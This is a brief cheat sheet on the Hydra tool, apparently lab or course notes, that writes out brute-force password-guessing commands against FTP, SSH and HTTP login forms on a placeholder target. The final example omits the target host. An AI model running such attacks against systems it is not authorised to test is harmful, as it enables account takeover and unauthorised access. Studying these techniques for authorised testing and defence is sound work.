Hydra Usage
--------------------------------

hydra is pretty simple:

when using a single item (username, password etc.) the - is NOT capitalised, if we want to use multiple items (a wordlist) we capitalise the -. For example: 

# Using a single username and a password wordlist to attack an ftp server
hydra -l *single_user* -P wordlist.txt ftp://TARGET_IP

# using a wordlist of usernames AND passwords to attack ssh 
# we use '-t 4' to specifiy how many threads to use (allows hydra to run parrallex X times or in this case 4.)
hydra -L username_wordlist.txt -P password_wordlist.txt TARGET_IP -t 4 ssh

# Hydra is also able to bruteforce http web login forms
sudo hydra <username> <wordlist> TARGET_IP http-post-form "<path>:<login_credentials>:<invalid_response>"

# A more indepth example. THIS IS NOT FOOL PROOF
# IT WOULD BE REQUIRED TO LOOK AT THE REQUEST SENT AND SEE THE EXACT DATA IS BEING SENT!!!
# the 'F:' part is just the string in the response that is supplied when it is incorrect.
sudo hydra -l username -P passwords.txt  http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
